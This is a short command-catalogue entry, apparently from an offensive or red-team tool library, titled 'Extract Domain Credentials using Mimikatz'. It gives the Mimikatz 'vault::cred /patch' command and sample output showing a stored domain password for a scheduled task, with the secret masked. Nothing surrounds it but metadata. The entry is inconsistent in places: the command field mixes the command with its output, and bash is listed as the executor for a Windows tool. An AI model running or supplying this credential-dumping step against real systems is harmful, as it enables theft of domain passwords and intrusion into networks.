---
id: 29917ada-4c4d-46e8-9634-c58df51483c3
name: Extract Domain Credentials using Mimikatz
type: command
executor: bash
data: 'mimikatz(commandline) # vault::cred /patch

  TargetName : Domain:batch=TaskScheduler:Task:{CF3ABC3E-4B17-ABCD-0003-A1BA192CDD0B}
  / <NULL>

  UserName   : DOMAIN\user

  Comment    : <NULL>

  Type       : 2 - domain_password

  Persist    : 2 - local_machine

  Flags      : 00004004

  Credential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

  Attributes : 0'
output: null
created_at: '2023-04-06T03:56:27.544321+00:00'
updated_at: '2023-04-10T20:37:16.580607+00:00'
---

# Extract Domain Credentials using Mimikatz

```bash
mimikatz(commandline) # vault::cred /patch
TargetName : Domain:batch=TaskScheduler:Task:{CF3ABC3E-4B17-ABCD-0003-A1BA192CDD0B} / <NULL>
UserName   : DOMAIN\user
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00004004
Credential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Attributes : 0
```


